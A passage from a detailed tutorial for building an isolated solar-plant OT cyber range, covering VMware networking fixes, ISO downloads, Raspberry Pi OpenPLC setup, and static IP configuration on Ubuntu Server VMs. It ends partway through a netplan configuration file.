Problem: VMnet adapters don't appear in ipconfig
Fix: Windows Services → VMware DHCP Service → Start
     Windows Services → VMware NAT Service → Start
     Services → VMware Authorization Service → Start (set to Automatic)
     Restart VMware after starting services.

Problem: After adding VMnets, internet stops working
Fix: This is a known VMware issue on some systems. 
     Disable then re-enable your real network adapter:
     Control Panel → Network Connections → Right-click your real adapter → Disable → Enable
     Or: VMware → Edit → Virtual Network Editor → Restore Defaults → Reconfigure

Problem: Can't find "Virtual Network Editor" in the menu
Fix: Some VMware installs put it at:
     C:\Program Files (x86)\VMware\VMware Workstation\vmnetcfg.exe
     Run this directly as Administrator.
```

---

## STEP 5: Download All ISO Files

### 🔵 Why Download Everything First

You need multiple ISOs. Each is 1–5 GB. Missing an ISO mid-build wastes hours waiting. Corrupt ISOs waste installation time. Download everything now, verify checksums, store on both workstations (or a shared USB drive).

### 🟢 Action: Download All Required ISOs

```
Step 5.1: Create ISO storage folder on both workstations:
          WS-A: D:\ISOs\   (or wherever your large drive is)
          WS-B: D:\ISOs\
          
          If using a shared USB drive: F:\ISOs\ (use same path on both)

ISO 1: Ubuntu 24.04.4 LTS SERVER
   URL: https://ubuntu.com/download/server
   Select: Ubuntu Server 24.04 LTS → Download (downloads latest point release)
   Filename: ubuntu-24.04.4-live-server-amd64.iso
   Size: ~2.7 GB
   Used for: Field-Simulator, Historian, Wazuh-SIEM, ERP-Odoo, Bastion-Host
   
   WHY SERVER not Desktop: No GUI overhead. Uses 512 MB RAM vs 2 GB
   for Desktop. We access these via SSH — no screen needed.
   Ubuntu 24.04.4 is the 4th point release of "Noble Numbat" LTS (until April 2029).
   
   ⚠️ DO NOT use VMware Easy Install with this ISO — see Step 8.2.
   The 24.04.4 Subiquity installer conflicts with Easy Install preseed.

ISO 2: Ubuntu 24.04.4 LTS DESKTOP
   URL: https://ubuntu.com/download/desktop
   Select: Ubuntu 24.04 LTS → Download (downloads latest point release)
   Filename: ubuntu-24.04.4-desktop-amd64.iso
   Size: ~5.7 GB
   Used for: SCADA-Server (needs browser for ScadaBR UI)
   
   WHY DESKTOP for SCADA: Operators view SCADA on a screen.
   The ScadaBR interface is browser-based. Desktop gives us Firefox
   and a display environment so we can actually SEE the HMI.

ISO 3: Windows Server 2022 Evaluation
   URL: https://www.microsoft.com/evalcenter/evaluate-windows-server-2022
   Click: ISO Download, English, 64-bit
   Registration: Required (free — use any email address)
   Filename: SERVER_EVAL_x64FRE_en-us.iso
   Size: ~4.7 GB
   Used for: ActiveDirectory VM
   
   WHY EVALUATION: Full-featured Windows Server 2022 for 180 days.
   Includes all Active Directory Domain Services. No credit card needed.

ISO 4: pfSense CE 2.7.x
   URL: https://www.pfsense.org/download/
   Select: AMD64, ISO Installer, CD Image
   File downloads as .gz compressed: pfSense-CE-2.7.x-RELEASE-amd64.iso.gz
   
   EXTRACT it: Install 7-Zip (https://7-zip.org) → Right-click .gz → 7-Zip → Extract
   Result: pfSense-CE-2.7.x-RELEASE-amd64.iso
   Size: ~800 MB
   Used for: pfSense-Internal and pfSense-External (same ISO, different configs)

ISO 5: Kali Linux 2024.x
   URL: https://www.kali.org/get-kali/#kali-installer-images
   Select: Installer → 64-bit
   Filename: kali-linux-2024.x-installer-amd64.iso
   Size: ~4.1 GB
   Used for: RedTeam-Kali (attacker simulation)

Step 5.2: Verify checksums (STRONGLY RECOMMENDED):
   Ubuntu provides SHA256 checksums on the download page.
   On Windows 11, open PowerShell:
   
   Get-FileHash "D:\ISOs\ubuntu-24.04.4-live-server-amd64.iso" -Algorithm SHA256
   
   Compare the output to the checksum on ubuntu.com.
   They should be IDENTICAL. Even one character difference = corrupt file.
   
   WHY: A corrupt ISO fails mid-installation, wasting 30-60 minutes.
   A 30-second checksum check prevents this.
```

### 🟡 Verify: ISO Downloads Complete

```
D:\ISOs\ should contain:
[ ] ubuntu-24.04.4-live-server-amd64.iso    (~2.7 GB)
[ ] ubuntu-24.04.4-desktop-amd64.iso        (~5.7 GB)
[ ] SERVER_EVAL_x64FRE_en-us.iso            (~4.7 GB)
[ ] pfSense-CE-2.7.x-RELEASE-amd64.iso      (~800 MB)
[ ] kali-linux-2024.x-installer-amd64.iso   (~4.1 GB)

Total: ~18 GB — verify all files show full size (not 0 bytes or truncated)
```

---

# ═══════════════════════════════════════════════════
# PHASE 1 — RASPBERRY PI & LEVEL 0 FIELD DEVICES
# ═══════════════════════════════════════════════════

## STEP 6: Flash Raspberry Pi OS with Desktop (GUI)

### 🔵 The Raspberry Pi's Role — Why It's Special

Every other component in this cyber range is a virtual machine. The Raspberry Pi is **real hardware**. This distinction matters enormously:

1. **Authenticity:** OpenPLC on real Pi hardware behaves like a real industrial PLC — actual timing, real CPU cycles, genuine GPIO pins available for future expansion
2. **Interview value:** "I ran an IEC 61131-3 PLC on Raspberry Pi hardware" is far more impressive than "I simulated everything in software"
3. **Physical Layer:** You can hold the Level 1 controller. The blinking LED IS the PLC running your program.

**Why GUI OS instead of Lite (headless)?**

The original guide used Raspberry Pi OS Lite (headless, no desktop). This guide switches to **Raspberry Pi OS with Desktop** because:
- You're a first-timer — seeing the GUI makes understanding the Pi easier
- You can view OpenPLC's web interface directly on a connected monitor
- VNC (remote desktop) lets you see the Pi's screen from Windows without SSH-only access
- If SSH breaks, you have a GUI fallback — critical for learning
- The Pi 4 with 4-8 GB RAM easily handles the desktop environment alongside OpenPLC

> **Alternative (experienced users):** Raspberry Pi OS Lite is mentioned throughout this section with alternate steps in `[ LITE VERSION ]` callout boxes. Both approaches work; GUI is recommended for first-timers.

### 🟢 Action: Flash Raspberry Pi OS with Desktop

```
Step 6.1: On WS-A, download Raspberry Pi Imager:
          URL: https://www.raspberrypi.com/software/
          Install and open it.
          
          WHY Imager over manual: Imager handles partition formatting,
          correct boot sector writing, AND pre-configuration of SSH,
          hostname, and credentials — all before first boot. This saves
          significant troubleshooting time.

Step 6.2: Insert your SD card into WS-A
          Use the USB SD card reader from your Pi kit if WS-A has no slot.
          
          ⚠️ DOUBLE-CHECK which storage device is your SD card in Windows
          before writing. Imager will ERASE everything on the selected device.

Step 6.3: In Raspberry Pi Imager:
          
          CHOOSE DEVICE button:
          → Select: Raspberry Pi 4
          
          CHOOSE OS button:
          → Raspberry Pi OS (other)     [for GUI option]
          → Raspberry Pi OS (64-bit)    ← THIS ONE — the main Desktop version
             Description says: "Recommended OS for Raspberry Pi 4"
             This includes the full PIXEL desktop environment.
          
          [ LITE VERSION ] Instead choose:
          → Raspberry Pi OS (other) → Raspberry Pi OS Lite (64-bit)
          
          WHY 64-bit: Raspberry Pi 4 has a 64-bit ARM Cortex-A72 CPU.
          64-bit OS uses memory more efficiently, required for OpenPLC 
          Runtime v3, and some Python libraries perform better on 64-bit.

Step 6.4: CHOOSE STORAGE button:
          Select your SD card from the list.
          Verify the size matches your card (e.g., "32.0 GB" for a 32 GB card).
          DO NOT select your laptop drive or USB stick by mistake.

Step 6.5: Click "NEXT" — Imager asks "Would you like to apply OS customisation settings?"
          Click "EDIT SETTINGS"
          
          This opens the customisation panel. Fill in:

          ┌─────────────────────────────────────────────────────────┐
          │ GENERAL TAB                                             │
          │                                                         │
          │ Set hostname: solar-plc                                 │
          │ WHY: This name identifies the Pi in network logs.       │
          │ "solar-plc" is descriptive. It will show as:           │
          │ solar-plc.local on the network.                         │
          │                                                         │
          │ Set username and password:                              │
          │   Username: pi                                          │
          │   Password: SolarPLC2024!                              │
          │ WHY strong password: Pi will be on OT network.         │
          │ Weak passwords = red team opportunity.                  │
          │                                                         │
          │ Configure wireless LAN: SKIP (we use Ethernet only)    │
          │ WHY skip WiFi: OT devices use wired connections.        │
          │ WiFi adds an uncontrolled network interface.           │
          │                                                         │
          │ Set locale settings:                                    │
          │   Time zone: Asia/Kolkata                               │
          │   Keyboard layout: gb (or us if US keyboard)           │
          └─────────────────────────────────────────────────────────┘

          ┌─────────────────────────────────────────────────────────┐
          │ SERVICES TAB                                            │
          │                                                         │
          │ Enable SSH: ✅ CHECK THIS                                │
          │ ○ Use password authentication (select this)            │
          │                                                         │
          │ WHY SSH: Even with GUI, SSH is how we send commands     │
          │ from Windows terminals and run scripts. SSH is the      │
          │ primary interface for professional Pi management.       │
          └─────────────────────────────────────────────────────────┘

          Click "SAVE" then "YES" to apply settings.

Step 6.6: Imager asks to confirm writing:
          "All existing data on your SD card will be erased" → YES
          
          Writing takes 3-8 minutes depending on SD card speed.
          Verification (checksum) takes another 2-4 minutes.
          DO NOT remove SD card until "Write Successful" message appears.
          
          WHY wait for verification: If writing was interrupted or the 
          SD card is defective, verification catches it now vs. Pi failing 
          to boot 10 minutes later.
```

### 🛠️ Troubleshoot: SD Card and Imager Issues

```
Problem: Imager doesn't recognize SD card
Fix: Try a different USB SD card reader port.
     Try a different USB SD card reader (cheap readers often fail).
     In Windows: Disk Management → verify SD card appears.
     Format the SD card as FAT32 first (won't hurt), then try Imager again.

Problem: "Write Successful" but Pi doesn't boot
Fix: Check that SD card is fully inserted (push until it clicks in most cases).
     Check Pi power supply is the official 5V 3A USB-C adapter from your kit.
     Inadequate power = random boot failures. Use ONLY the official PSU.

Problem: Can't find SD card in list during flashing
Fix: Windows Device Manager → Disk drives → confirm card appears.
     If showing as "Unknown Device" → card may be faulty. Try another card.
```

---

## STEP 7: Connect Pi to WS-A and Configure Networking

### 🔵 Why Direct Ethernet Connection (Not Through Router)

The Raspberry Pi represents a PLC inside an isolated OT network. In a real solar plant, the OT network is physically separate from the corporate IT network and the internet. We simulate this by connecting the Pi **directly** to WS-A via Ethernet, bypassing your home router entirely.

This direct connection = the Pi is on our isolated OT-LEVEL1-NET (10.10.10.x), accessible ONLY through controlled paths we define.

### 🟢 Action: Physical Connection

```
Step 7.1: Insert flashed SD card into Raspberry Pi (gold contacts face down)
          Push gently until it seats. Don't force it.

Step 7.2: Connect Ethernet cable:
          One end → Pi's Ethernet port (RJ45, next to USB ports)
          Other end → WS-A's Ethernet port (physical port, NOT USB-to-Ethernet)
          
          IF WS-A has no Ethernet port (laptop/desktop with only WiFi):
          → Use a USB 3.0 to Gigabit Ethernet adapter from your Pi kit or purchase one
          → These work plug-and-play on Windows 11

Step 7.3: Connect Pi power supply
          Official Raspberry Pi 4 PSU: USB-C, 5V 3A minimum
          Pi boots AUTOMATICALLY when power is connected.
          Watch the green LED: rapid blinking = SD card reading = booting
          First boot takes 60-120 seconds (resizes filesystem to fill SD card)
```

### 🟢 Action: Configure WS-A Ethernet Adapter for Pi Communication

```
Step 7.4: PREREQUISITE — WS-A Ethernet Port Setup:
          
          WS-A MUST have TWO separate physical Ethernet connections:
          
          ┌────────────────────────────────────────────────────────────┐
          │ ETH-PORT-1 (Main LAN): Already connected to home router   │
          │   → WS-A's internet access, connection to WS-B            │
          │   → Gets IP from router DHCP (e.g. 192.168.1.xx)          │
          │   → DO NOT change this adapter                             │
          │                                                            │
          │ ETH-PORT-2 (Pi Link): Dedicated direct cable to Pi only   │
          │   → This is the port VMnet2 will be BRIDGED to            │
          │   → Set to: 10.10.10.100 (static) — see Step 7.4a below  │
          └────────────────────────────────────────────────────────────┘
          
          If WS-A has only ONE built-in Ethernet port:
          → Purchase a USB 3.0 to Gigabit Ethernet adapter (~₹500-800)
          → Plug into WS-A → Windows installs driver automatically
          → This becomes ETH-PORT-2 — use ONLY for Pi
          
Step 7.4a: Configure ETH-PORT-2 (the Pi-dedicated port):
          
          Right-click Start → "Network Connections" → Change adapter options
          
          Identify ETH-PORT-2: Disconnect the Pi cable briefly — the adapter
          that shows "Network cable unplugged" is your Pi port. Reconnect cable.
          
          Right-click ETH-PORT-2 adapter → Properties
          → Double-click "Internet Protocol Version 4 (TCP/IPv4)"
          → ○ Use the following IP address:
          
          IP address:      10.10.10.100
          Subnet mask:     255.255.255.0
          Default gateway: (leave BLANK — direct link, no router)
          DNS servers:     (leave blank)
          
          Click OK → Close
          
          WHY 10.10.10.100: Places WS-A itself on the OT-LEVEL1-NET for
          direct management access to the Pi when needed. The Pi at
          10.10.10.1 and this adapter are on the same /24 — no routing needed.
          
          WHY no gateway: ETH-PORT-2 is a direct cable to Pi only. Setting
          a gateway would try to route traffic through a router that does not
          exist, breaking communication. Leave it blank.
```

### 🟢 Action: First SSH Login to Raspberry Pi

```
Step 7.6: On WS-A, open Windows Terminal or PowerShell (Windows 11 includes SSH built-in):
          
          ping 10.10.10.1
          
          If Raspberry Pi OS with Desktop is booting successfully, you'll see:
          Reply from 10.10.10.1: bytes=32 time<1ms TTL=64
          
          If "Request timed out": Pi is still booting. Wait 30 more seconds.
          If consistently "timed out" after 3 minutes: See troubleshooting below.

Step 7.7: SSH into the Pi:
          ssh pi@10.10.10.1
          
          First time only: "The authenticity of host '10.10.10.1' can't be 
          established... Are you sure you want to continue? (yes/no)"
          Type: yes  → Enter
          
          Password: SolarPLC2024!
          
          Success! You should see:
          pi@solar-plc:~ $
          
          WHY this works even with GUI OS: Raspberry Pi OS with Desktop 
          still runs SSH server. The desktop is for the physical screen/VNC
          access. SSH works simultaneously, independently.

Step 7.8: Update the operating system (ALWAYS do this first):
          sudo apt update && sudo apt full-upgrade -y
          
          WHY full-upgrade (not just upgrade): On Ubuntu 24, "apt full-upgrade"
          handles packages that need to be removed or replaced during updates.
          Regular "apt upgrade" skips packages with changed dependencies.
          On Pi OS, full-upgrade is safer for firmware updates too.
          
          This takes 5-20 minutes depending on how many updates are pending.
          Wait for it to complete — don't interrupt.

Step 7.9: Set permanent static IP (the proper Pi OS way for GUI version):
          Raspberry Pi OS with Desktop uses NetworkManager (not dhcpcd).
          
          First — find the exact name of the active wired connection:
          nmcli -t -f NAME,DEVICE,STATE connection show --active
          
          You'll see output like:
          "Wired connection 1:eth0:activated"
          
          The connection name is everything before the first colon.
          It is usually "Wired connection 1" but may differ on your Pi.
          Use whatever name is shown in the commands below.
          
          Configure static IP using nmcli:
          sudo nmcli connection modify "Wired connection 1" \
            ipv4.addresses "10.10.10.1/24" \
            ipv4.gateway "10.10.10.254" \
            ipv4.dns "8.8.8.8" \
            ipv4.method manual
          
          sudo nmcli connection up "Wired connection 1"
          
          ⚠️ Replace "Wired connection 1" with the actual name shown above
          if it differs on your Pi.
          
          WHY gateway 10.10.10.254 (pfSense-Internal):
          pfSense-Internal will be the router for the OT-LEVEL1-NET, with its
          interface on this subnet at .254. The Pi uses pfSense as its gateway
          for reaching other subnets (SCADA at 10.10.20.x, Historian at 10.10.30.x).
          The Pi is NOT the gateway for other devices — it is a PLC endpoint.
          
          ⚠️ NOTE: pfSense will be installed in Phase 5. Until then, cross-subnet
          pings will fail — this is expected. Within 10.10.10.0/24, communication
          between Pi, Field-Simulator, and WS-A works immediately.
          
          WHY NOT 10.10.10.100 as gateway: WS-A's ETH-PORT-2 is not a router.
          It does not forward packets between subnets. Setting WS-A as gateway
          would black-hole any cross-subnet traffic.
          
          [ OLDER Pi OS / dhcpcd METHOD ]:
          If nmcli is not found, your Pi OS uses dhcpcd:
          sudo nano /etc/dhcpcd.conf
          Add at the bottom:
          interface eth0
          static ip_address=10.10.10.1/24
          static routers=10.10.10.254
          static domain_name_servers=8.8.8.8
          Save (Ctrl+X → Y → Enter)
          sudo systemctl restart dhcpcd

Step 7.9a: INTERNET ACCESS FOR PI DURING SETUP (IMPORTANT):
           The Pi is on an isolated OT network (no internet). But later steps
           (STEP 12: OpenPLC) require downloading from GitHub and running apt.
           
           OPTION A — Temporary WiFi (Recommended):
           sudo nmcli device wifi connect "YourHomeWiFi" password "YourWiFiPassword"
           
           Verify internet: ping -c 3 8.8.8.8
           
           Do all internet-requiring setup while WiFi is connected.
           After OpenPLC is fully installed and configured, DISABLE WiFi:
           sudo nmcli radio wifi off
           
           WHY disable WiFi after: OT PLCs must not have uncontrolled internet
           access. An OT device on WiFi creates an uncontrolled network interface
           that bypasses your carefully designed segmentation. Disable it.
           
           OPTION B — USB Ethernet with ICS (if Pi has no WiFi):
           On WS-A: Go to ETH-PORT-1 (main LAN) → Properties → Sharing tab
           ✅ Allow other network users to connect through this computer's Internet connection
           Home networking connection: Select ETH-PORT-2 (Pi adapter)
           
           This routes internet through WS-A for the Pi. Disable ICS after setup.

Step 7.10: Set timezone:
           sudo timedatectl set-timezone Asia/Kolkata
           
           Verify: date
           Expected: Current date and time in IST (India Standard Time)

Step 7.11: Reboot Pi to apply all changes:
           sudo reboot
           
           Wait 60 seconds, then SSH back:
           ssh pi@10.10.10.1
           
           Verify IP persisted:
           ip addr show eth0
           Expected: inet 10.10.10.1/24 brd 10.10.10.255 scope global
```

### 🟢 Optional: Enable VNC for GUI Remote Desktop Access

```
Step 7.12: Enable VNC server (GUI remote access from Windows):
           sudo raspi-config
           
           Navigate: Interface Options → VNC → Enable → Yes → Finish → Reboot
           
           On WS-A: Download RealVNC Viewer (free):
           https://www.realvnc.com/en/connect/download/viewer/
           
           Connect to: 10.10.10.1
           Credentials: pi / SolarPLC2024!
           
           You now see the Pi's full desktop on your Windows screen.
           WHY useful: You can see OpenPLC's web interface, file manager,
           terminal — everything visually. Great for learning and debugging.
```

### 🛠️ Troubleshoot: Pi Networking Issues

```
Problem: Pi doesn't respond to ping (no replies)
Fix checklist:
  1. Is the green LED on Pi blinking? No LED = power problem.
     Use the official USB-C adapter from your kit. 
     Underpowered Pi randomly fails to boot.
  2. Is the Ethernet cable actually plugged into BOTH ports?
     Check both ends. Test with a different cable.
  3. Is WS-A's physical Ethernet set to 10.10.10.100?
     Re-check Steps 7.4 — it must be the PHYSICAL adapter, not a VMware adapter.
  4. Is the SD card fully inserted? It should click in.
  5. Try a different SD card if you have one.

Problem: SSH connection refused
Fix: SSH is enabled via Imager's customisation (Step 6.5 Services tab).
     If you forgot to enable it: Remove SD card, insert into WS-A.
     In the "bootfs" partition, create an empty file named "ssh" (no extension).
     This triggers SSH enable on next boot.

Problem: "Host key verification failed" when SSH-ing
Fix: Pi's identity changed (reflashed, or different Pi).
     Run: ssh-keygen -R 10.10.10.1
     Then try SSH again and type "yes" to new fingerprint.

Problem: nmcli command not found
Fix: Your Pi OS version uses dhcpcd instead.
     Use the [ OLDER Pi OS / dhcpcd METHOD ] from Step 7.9.
     
Problem: Pi gets 169.254.x.x IP (APIPA address)
Fix: DHCP failed (no DHCP server on direct link). 
     This is normal — you haven't set a static IP yet.
     Follow Step 7.9 to set static IP.
     
Problem: Pi gets random IP from your home router
Fix: You connected Pi to the router instead of directly to WS-A.
     Move the Ethernet cable from router to WS-A's ETH-PORT-2 (dedicated Pi port).

Problem: Field-Simulator VM cannot ping the Pi (10.10.10.1)
Fix: VMnet2 is likely still set to Host-Only instead of Bridged.
     Open VMware Virtual Network Editor → Click VMnet2.
     Confirm it shows "Bridged" mapped to WS-A's ETH-PORT-2.
     If it shows "Host-Only" or any other mode, change it to Bridged,
     select the correct physical adapter, click Apply.
     Then on the Field-Simulator VM, restart networking:
     sudo netplan try
     Retry: ping 10.10.10.1
```

---

## ⚠️ UNIVERSAL RULE: Internet Access for All Ubuntu Server VMs

> **Read this before building ANY Ubuntu Server VM in this guide.**

All Ubuntu Server VMs in this project (Field-Simulator, Historian, SCADA-Server, Bastion, Wazuh) are on **Host-Only VMnets** — isolated networks with no internet access by design. However, you must run `apt update`, `apt install`, `pip install`, and download packages during setup. Without internet, all of those commands fail silently or with mirror errors.

**The solution: a temporary second NAT adapter.**

Every Ubuntu Server VM will have **two** network adapters during setup:

```
┌─────────────────────────────────────────────────────────────────┐
│  NETWORK ADAPTER SETUP PATTERN (apply to EVERY Ubuntu Server VM)│
│                                                                 │
│  Adapter 1: The VM's PERMANENT OT/segment adapter              │
│    → VMnet2 (Field-Sim), VMnet3 (SCADA), VMnet4 (Historian),   │
│      VMnet5 (Bastion), Bridged (Wazuh)                         │
│    → Gets the VM's real static IP on its network segment       │
│    → KEPT forever                                               │
│                                                                 │
│  Adapter 2: TEMPORARY NAT (VMnet8) — internet only             │
│    → Added before installation OR right after first boot       │
│    → Gets DHCP IP automatically (192.168.216.x)                │
│    → Used ONLY for: apt update, apt install, pip install,      │
│      git clone, wget downloads                                  │
│    → REMOVED from VM settings once all packages are installed  │
└─────────────────────────────────────────────────────────────────┘
```

### How to Add / Remove the Temporary NAT Adapter

```
ADD (before or right after VM creation):
  VMware → Right-click VM → Settings → Add → Network Adapter
  Connection: VMnet8 (NAT)
  Click OK → Power on VM

  Inside the VM — verify internet works:
  ip addr show    ← should show two interfaces; one gets 192.168.216.x via DHCP
  ping -c 3 8.8.8.8   ← must succeed before running any apt/pip commands

REMOVE (after all packages are installed):
  Power off the VM: sudo poweroff
  VMware → Right-click VM → Settings
  Click the "Network Adapter 2" entry (the VMnet8 / NAT one)
  Click "Remove" → OK
  Power VM back on
  Verify only the permanent adapter remains: ip addr show
```

> **WHY remove it after setup?** OT VMs must not have uncontrolled internet access in the running system. Leaving a NAT adapter on Field-Simulator or Historian would let those VMs bypass your carefully designed pfSense segmentation — defeating the whole point of the architecture. Install everything you need, then remove the NAT adapter permanently.

---

## STEP 8: Create the Field-Simulator VM on WS-A

### 🔵 Why a Separate VM for Field Devices?

The field simulator (Python + Modbus) must run on OT-LEVEL1-NET (10.10.10.x) — the same isolated network as the Raspberry Pi PLC. A VM on VMnet2 (Bridged to WS-A's ETH-PORT-2) sits on the same physical wire segment as the Pi. From the Pi's perspective, the Field-Simulator VM is simply another device on the 10.10.10.x segment — exactly how real field devices are wired to a PLC on an OT network.

**What this VM represents:** Four solar inverters + weather station + battery system, each communicating via Modbus TCP — the same protocol real Fronius, SMA, and ABB inverters use.

### 🟢 Action: Create Field-Simulator VM in VMware

```
Step 8.1: On WS-A, open VMware Workstation Pro
          File → New Virtual Machine
          
          Setup type: ○ Typical (recommended) → Next
          
Step 8.2: Select installer disk image:
          ○ Installer disc image file (iso):
          Browse → D:\ISOs\ubuntu-24.04.4-live-server-amd64.iso → Open
          → Next
          
          VMware recognizes Ubuntu and shows "Easy Install":
          Full name: Solar Admin
          User name: solaradmin
          Password: SolarLab2024!
          
          ⚠️ RECOMMENDATION: Bypass VMware Easy Install for Ubuntu 24.04.4.
          Easy Install uses an older preseed method that conflicts with the
          24.04.4 Subiquity installer. Instead:
          Select: "I will install the operating system later" → Next
          This gives you full control over the 24.04.4 installer screens.
          → Next

Step 8.3: Virtual Machine Name and Location:
          Virtual machine name: Field-Simulator
          Location: D:\VMs\Field-Simulator\
          → Next

Step 8.4: Specify Disk Capacity:
          Maximum disk size (GB): 20
          ○ Store virtual disk as a single file → Next

Step 8.5: Ready to Create Virtual Machine — click "Customize Hardware"
          
          Memory: 2048 MB (2 GB)
          
          Processors: 1 processor, 2 cores per processor
          
          CD/DVD: Use ISO file → browse to ubuntu-24.04.4-live-server-amd64.iso
          ✅ Connect at power on: CHECKED
          
          Network Adapter (Adapter 1 — permanent):
          Network connection: ○ Custom → VMnet2 (OT-LEVEL1-NET)
          
          ⚠️ ADD A SECOND ADAPTER NOW (internet for package installation):
          Click "Add..." → Network Adapter → Finish
          New Network Adapter: VMnet8 (NAT)
          WHY: This is the temporary internet adapter. Without it, apt install
          will fail — VMnet2 is isolated and has no internet.
          
          Display: ☐ Accelerate 3D graphics → UNCHECK
          
          Click Close → Finish → Power On
```

### 🟢 Action: Install Ubuntu 24.04.4 Server — Step by Step

```
Step 8.6: Ubuntu 24.04.4 Server uses the Subiquity installer (TUI — text UI).
          The 24.04.4 installer screens differ from 22.04 AND from earlier 24.04.x.
          Follow EXACTLY in order:

          ── SCREEN 1: Language ──────────────────────────────────────────
          "Please choose your preferred language"
          Use arrow keys → Select: English
          Press Enter

          ── SCREEN 2: Keyboard Configuration ────────────────────────────
          Layout: English (US)  — or your keyboard layout
          Variant: English (US)
          Tab to "Done" → Enter

          ── SCREEN 3: Choose type of install ────────────────────────────
          NOTE: In Ubuntu 24.04.4 this screen may appear as:
          "Ubuntu Server" (selected by default) — leave it selected
          "Ubuntu Server (minimised)" — do NOT select this
          Tab to "Done" → Enter
          
          WHY not minimised: The minimised variant removes standard system
          tools (editors, curl, wget, man pages, net-tools). You will need
          these for the build — always choose full Ubuntu Server.

          ── SCREEN 4: Network Connections ───────────────────────────────
          You will see TWO interfaces listed:
          
          Interface 1 (VMnet8/NAT adapter — eth0 or ens33):
            → Should already show an IP like 192.168.216.xxx (DHCP from NAT)
            → This is your temporary internet adapter — leave as DHCP
          
          Interface 2 (VMnet2/OT adapter — ens34 or similar):
            → Shows "not connected" or no IP — this is CORRECT
            → VMnet2 is bridged to ETH-PORT-2 with no DHCP server
            → We will configure this manually after install
          
          Tab to "Done" → Enter
          
          ⚠️ If you see only ONE interface: Your second adapter may not
          have been added yet. Exit install, add VMnet8 adapter in VMware
          Settings, then power on again.

          ── SCREEN 5: Configure proxy ───────────────────────────────────
          Leave blank → Done

          ── SCREEN 6: Configure Ubuntu archive mirror ────────────────────
          The installer auto-detects the best mirror.
          
          CHANGE the mirror URL to the India mirror:
          Clear the current URL and type:
          http://in.archive.ubuntu.com/ubuntu
          
          Tab to "Done" → installer tests the mirror connection.
          Wait for "This mirror location passed tests" confirmation.
          → Done
          
          WHY change mirror: Default mirror is often US-based. India mirror
          is 5-10× faster from Indian networks — saves 20-40 minutes.

          ── SCREEN 7: Guided storage configuration ──────────────────────
          ○ Use an entire disk  (selected by default) — leave it
          ☐ Set up this disk as an LVM group — UNCHECK this
          
          WHY no LVM: LVM adds complexity without benefit for our single-VM
          setup. Direct partitioning is simpler and performs identically.
          
          Tab to "Done" → Enter
          
          Storage configuration summary screen appears.
          Tab to "Done" → Enter
          Confirm destructive action: Tab to "Continue" → Enter

          ── SCREEN 8: Profile configuration ─────────────────────────────
          Your name:             Solar Admin
          Your server's name:    field-simulator
          Pick a username:       solaradmin
          Choose a password:     SolarLab2024!
          Confirm password:      SolarLab2024!
          Tab to "Done" → Enter

          ── SCREEN 9: Ubuntu Pro ────────────────────────────────────────
          "Skip for now" is selected by default → Tab to "Continue" → Enter
          WHY skip: Ubuntu Pro is for enterprise extended support.
          Not needed for our cyber range.

          ── SCREEN 10: SSH Setup ─────────────────────────────────────────
          ✅ Install OpenSSH server — Press SPACE to check this box
          ☐ Import SSH identity — leave unchecked
          Tab to "Done" → Enter
          
          WHY OpenSSH is critical: SSH is how you manage ALL Server VMs
          from Windows Terminal (copy-paste works). The VMware console
          does not support clipboard — you cannot paste the Python scripts
          without SSH. This MUST be installed during setup.

          ── SCREEN 11: Featured server snaps ─────────────────────────────
          Do NOT select anything → Tab to "Done" → Enter
          WHY: Docker, microk8s etc. consume disk and RAM unnecessarily.

          ── INSTALLATION PROGRESS ────────────────────────────────────────
          Installation runs: 5-15 minutes.
          You will see packages being installed and configured.
          
          When complete: "Reboot Now" appears → Tab to it → Enter
          
          "Please remove the installation medium, then press ENTER"
          → In VMware: VM menu → Removable Devices → CD/DVD → Disconnect
          → Press Enter in the VM window

Step 8.7: After reboot — first login:
          The VM boots to a text login prompt:
          
          field-simulator login: solaradmin
          Password: SolarLab2024!
          
          You should see: solaradmin@field-simulator:~$
          
          Immediately verify internet via the NAT adapter:
          ping -c 3 8.8.8.8
          
          Expected: 3 packets received (via the VMnet8 NAT adapter)
          If ping fails: Check VMnet8 adapter is connected in VMware settings.
          
          Update the system FIRST (while internet is available):
          sudo apt update && sudo apt full-upgrade -y
          
          This may take 5-15 minutes. Do not skip — security patches and
          package index must be current before installing any other software.
```

### 🟢 Action: Configure Static IP on Ubuntu 24.04.4 Server (Critical — Read Carefully)

```
Step 8.8: Find your network interface names:
          ip link show
          
          Ubuntu 24.04.4 in VMware typically shows:
          lo          → loopback, ignore
          ens33       → first adapter (VMnet8/NAT — temporary internet)
          ens34       → second adapter (VMnet2/OT — our permanent adapter)
          
          The exact names depend on VMware adapter order:
          - If you added VMnet2 first, it may be ens33
          - If you added VMnet8 second, it may be ens34
          
          To identify which is which, check their current IPs:
          ip addr show
          
          The adapter with a 192.168.216.x IP = VMnet8 (NAT/internet)
          The adapter with NO IP = VMnet2 (OT-LEVEL1-NET — configure this one)
          
          Write down both names:
          Internet adapter (NAT):  _____________  (will be removed later)
          OT adapter (permanent):  _____________  (gets 10.10.10.10)

Step 8.9: Check what exists in the Netplan directory:
          ls -la /etc/netplan/
          
          On Ubuntu 24.04.4 Server you may see ONE of these situations:
          
          SITUATION A — Directory is EMPTY:
          total 0
          (no yaml files listed)
          → Most common in 24.04.4 when the installer couldn't get DHCP.
          → Proceed directly to Step 8.10. No cleanup needed.
          
          SITUATION B — Contains 00-installer-config.yaml:
          -rw-r--r-- 1 root root  xxx  00-installer-config.yaml
          → Rename it to avoid conflict:
          sudo mv /etc/netplan/00-installer-config.yaml \
                  /etc/netplan/00-installer-config.yaml.bak
          → Then proceed to Step 8.10.
          
          SITUATION C — Contains 50-cloud-init.yaml:
          -rw-r--r-- 1 root root  xxx  50-cloud-init.yaml
          → Rename it: sudo mv /etc/netplan/50-cloud-init.yaml \
                               /etc/netplan/50-cloud-init.yaml.bak
          → Then proceed to Step 8.10.
          
          WHY check first: Writing a new config file without disabling
          the old one causes conflicts — netplan applies ALL .yaml files
          alphabetically. Two files defining the same interface = errors.

Step 8.10: Create the static IP configuration for the OT adapter.
           Replace OT_IFACE with your actual interface name from Step 8.8
           (e.g. ens34, ens33, eth1 — whichever has NO IP currently).
           Replace NAT_IFACE with the internet adapter name (e.g. ens33).
           
           sudo nano /etc/netplan/10-solar-network.yaml
           
           Type this EXACTLY (2-space indentation — YAML is strict):
```

```yaml
network:
  version: 2
  renderer: networkd
  ethernets:
    ens34:                          # ← REPLACE with your OT adapter name
      dhcp4: false
      dhcp6: false
      addresses:
        - 10.10.10.10/24
      routes:
        - to: default
          via: 10.10.10.254
      nameservers:
        addresses:
          - 8.8.8.8
          - 1.1.1.1
